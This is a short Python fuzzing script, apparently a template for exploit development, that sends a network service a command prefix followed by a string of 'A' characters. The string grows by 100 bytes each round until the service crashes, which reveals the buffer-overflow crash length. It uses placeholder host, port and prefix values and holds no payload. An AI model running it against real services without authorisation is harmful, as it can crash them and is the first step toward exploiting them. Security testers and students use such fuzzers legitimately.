#!/usr/bin/env python3

import socket, time, sys

rhost = "RHOST"             # Target IP

rport = RPORT               # Target Port (int format)
timeout = 5
prefix = "PREFIX "          # Target Prefix/Command to attack/fuzz (user input, i.e. 'USER ')

string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((rhost, rport))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
